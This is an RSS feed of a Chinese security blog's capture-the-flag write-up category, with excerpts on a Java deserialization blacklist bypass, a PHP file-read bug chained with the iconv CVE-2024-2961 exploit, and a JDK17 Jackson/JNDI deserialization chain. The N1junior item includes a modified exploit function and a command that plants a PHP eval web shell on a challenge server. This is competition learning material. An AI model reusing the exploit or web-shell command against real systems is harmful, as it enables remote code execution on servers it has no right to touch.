<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>WP on GSBP&#39;s Blog</title>
    <link>http://localhost:1313/categories/wp/</link>
    <description>Recent content in WP on GSBP&#39;s Blog</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 24 Mar 2025 22:00:00 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/categories/wp/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>软件攻防赛现场赛上对justDeserialize攻击的几次尝试</title>
      <link>http://localhost:1313/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/</link>
      <pubDate>Mon, 24 Mar 2025 22:00:00 +0800</pubDate>
      <guid>http://localhost:1313/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/</guid>
      <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;&#xA;&lt;p&gt;一个关于本地打通无数次但远程0次的故事&lt;/p&gt;&#xA;&lt;h2 id=&#34;题目分析&#34;&gt;题目分析&lt;/h2&gt;&#xA;&lt;p&gt;题目直接给了一个反序列化的入口点&lt;/p&gt;&#xA;&lt;p&gt;&#xA;&lt;div class=&#34;post-img-view&#34;&gt;&#xA;&lt;a data-fancybox=&#34;gallery&#34; href=&#34;https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250324233735530.png&#34;&gt;&#xA;&lt;img src=&#34;https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250324233735530.png&#34; alt=&#34;image-20250324233735530&#34;  /&gt;&#xA;&lt;/a&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;其中有两层防御&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;对我们的反序列化数据流中的明文进行简单判断过滤&lt;/li&gt;&#xA;&lt;li&gt;使用了一个自定义反序列化类来对我们的反序列化数据流进行反序列化&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;其中自定义化反序列化类代码如下&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//&#xA;// Source code recreated from a .class file by IntelliJ IDEA&#xA;// (powered by FernFlower decompiler)&#xA;//&#xA;&#xA;package com.example.ezjav.utils;&#xA;&#xA;import java.io.BufferedReader;&#xA;import java.io.ByteArrayInputStream;&#xA;import java.io.IOException;&#xA;import java.io.InputStream;&#xA;import java.io.InputStreamReader;&#xA;import java.io.InvalidClassException;&#xA;import java.io.ObjectInputStream;&#xA;import java.io.ObjectStreamClass;&#xA;import java.util.ArrayList;&#xA;&#xA;public class MyObjectInputStream extends ObjectInputStream {&#xA;    private String[] denyClasses;&#xA;&#xA;    public MyObjectInputStream(ByteArrayInputStream var1) throws IOException {&#xA;        super(var1);&#xA;        ArrayList&amp;lt;String&amp;gt; classList = new ArrayList();&#xA;        InputStream file = MyObjectInputStream.class.getResourceAsStream(&amp;#34;/blacklist.txt&amp;#34;);&#xA;        BufferedReader var2 = new BufferedReader(new InputStreamReader(file));&#xA;&#xA;        String var4;&#xA;        while((var4 = var2.readLine()) != null) {&#xA;            classList.add(var4.trim());&#xA;        }&#xA;&#xA;        this.denyClasses = new String[classList.size()];&#xA;        classList.toArray(this.denyClasses);&#xA;    }&#xA;&#xA;    protected Class&amp;lt;?&amp;gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {&#xA;        String className = desc.getName();&#xA;        int var5 = this.denyClasses.length;&#xA;&#xA;        for(int var6 = 0; var6 &amp;lt; var5; ++var6) {&#xA;            String denyClass = this.denyClasses[var6];&#xA;            if (className.startsWith(denyClass)) {&#xA;                throw new InvalidClassException(&amp;#34;Unauthorized deserialization attempt&amp;#34;, className);&#xA;            }&#xA;        }&#xA;&#xA;        return super.resolveClass(desc);&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从&lt;strong&gt;blacklist&lt;/strong&gt;中读取baned类，且在&lt;code&gt;resolveClass&lt;/code&gt;中进行过滤&lt;/p&gt;</description>
    </item>
    <item>
      <title>[2025]N1junior-WP</title>
      <link>http://localhost:1313/post/2025n1junior-wp/</link>
      <pubDate>Tue, 11 Feb 2025 23:00:00 +0800</pubDate>
      <guid>http://localhost:1313/post/2025n1junior-wp/</guid>
      <description>&lt;h2 id=&#34;gavatar&#34;&gt;Gavatar&lt;/h2&gt;&#xA;&lt;p&gt;一个php服务&lt;/p&gt;&#xA;&lt;p&gt;这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (!empty($_FILES[&amp;#39;avatar&amp;#39;][&amp;#39;tmp_name&amp;#39;])) {&#xA;    $finfo = new finfo(FILEINFO_MIME_TYPE);&#xA;    if (!in_array($finfo-&amp;gt;file($_FILES[&amp;#39;avatar&amp;#39;][&amp;#39;tmp_name&amp;#39;]), [&amp;#39;image/jpeg&amp;#39;, &amp;#39;image/png&amp;#39;, &amp;#39;image/gif&amp;#39;])) {&#xA;        die(&amp;#39;Invalid file type&amp;#39;);&#xA;    }&#xA;    move_uploaded_file($_FILES[&amp;#39;avatar&amp;#39;][&amp;#39;tmp_name&amp;#39;], $avatarPath);&#xA;} elseif (!empty($_POST[&amp;#39;url&amp;#39;])) {&#xA;    $image = @file_get_contents($_POST[&amp;#39;url&amp;#39;]);&#xA;    if ($image === false) die(&amp;#39;Invalid URL&amp;#39;);&#xA;    file_put_contents($avatarPath, $image);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用&lt;/p&gt;&#xA;&lt;p&gt;也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.ambionics.io/blog/iconv-cve-2024-2961-p1&#34;&gt;https://www.ambionics.io/blog/iconv-cve-2024-2961-p1&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;因为不是直接返回文件内容，而是需要我们从&lt;code&gt;avatar.php&lt;/code&gt;中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    def download(self, path: str) -&amp;gt; bytes:&#xA;        &amp;#34;&amp;#34;&amp;#34;Returns the contents of a remote file.&#xA;        &amp;#34;&amp;#34;&amp;#34;&#xA;        path = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;&#xA;        self.send(path)&#xA;        response=self.session.get(&amp;#34;http://39.106.16.204:20871/avatar.php?user=123&amp;#34;)&#xA;        print(response)&#xA;        data = response.text&#xA;        return base64.decode(data)&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后跑exp就好了&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python test.py http://39.106.16.204:20871/upload.php &amp;#34;echo &amp;#39;&amp;lt;?=@eval(\$_POST[0]);?&amp;gt;&amp;#39; &amp;gt; shell.php&amp;#34;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&#xA;&lt;div class=&#34;post-img-view&#34;&gt;&#xA;&lt;a data-fancybox=&#34;gallery&#34; href=&#34;https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png&#34;&gt;&#xA;&lt;img src=&#34;https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png&#34; alt=&#34;image-20250211210919337&#34;  /&gt;&#xA;&lt;/a&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;/p&gt;</description>
    </item>
    <item>
      <title>JDK17打Jackson&#43;LdapAttruibute反序列化</title>
      <link>http://localhost:1313/post/jdk17%E6%89%93jackson&#43;ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
      <pubDate>Mon, 20 Jan 2025 03:02:14 +0800</pubDate>
      <guid>http://localhost:1313/post/jdk17%E6%89%93jackson&#43;ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
      <description>&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;&#xA;&lt;p&gt;本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute+Jackson死活没通，后面自己调试了一下，这里做个记录&lt;/p&gt;&#xA;&lt;h2 id=&#34;题目分析&#34;&gt;题目分析&lt;/h2&gt;&#xA;&lt;p&gt;题目名叫&lt;code&gt;JDBCParty&lt;/code&gt;,jdk版本是17，里面给了个接口源码如下&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    @PostMapping({&amp;#34;/dbtest&amp;#34;})&#xA;    public ResponseEntity&amp;lt;String&amp;gt; dbtest(String data) {&#xA;        try {&#xA;            User credentials = (User)Utils.deserialize(data);&#xA;            Class.forName(this.driverClassName);&#xA;&#xA;            try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) {&#xA;                if (connection.isValid(5)) {&#xA;                    return ResponseEntity.ok(&amp;#34;connect success&amp;#34;);&#xA;                } else {&#xA;                    return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&amp;#34;connect failed&amp;#34;);&#xA;                }&#xA;            }&#xA;        } catch (Exception e) {&#xA;            e.printStackTrace();&#xA;            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&amp;#34;connect failed &amp;#34; + e.getMessage());&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。&lt;/p&gt;&#xA;&lt;p&gt;实际入口是那个反序列化，从这个反序列化里面做文章&lt;/p&gt;&#xA;&lt;p&gt;然后看看题目给的依赖&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- &amp;#34;BOOT-INF/lib/spring-boot-3.3.5.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/logback-classic-1.5.11.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/logback-core-1.5.11.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/log4j-api-2.23.1.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/snakeyaml-2.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jackson-databind-2.17.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jackson-core-2.17.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-web-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-beans-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-aop-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-context-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-expression-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/slf4j-api-2.0.16.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-core-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-jcl-6.1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-swing-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-anim-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-parser-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-svg-dom-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-awt-util-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/commons-io-1.3.1.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/commons-logging-1.0.4.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-bridge-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-xml-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-css-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-dom-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/xalan-2.7.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/serializer-2.7.2.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/xml-apis-1.4.01.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-ext-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-gui-util-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-gvt-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-script-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-shared-resources-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-util-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-constants-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/batik-i18n-1.14.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/fastjson2-2.0.37.jar&amp;#34;&#xA;- &amp;#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar&amp;#34;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作&lt;/p&gt;</description>
    </item>
    <item>
      <title>2025-SUCTF-WP</title>
      <link>http://localhost:1313/post/2025suctf/</link>
      <pubDate>Sat, 18 Jan 2025 19:38:41 +0800</pubDate>
      <guid>http://localhost:1313/post/2025suctf/</guid>
      <description>2025年的第一场XCTF</description>
    </item>
  </channel>
</rss>
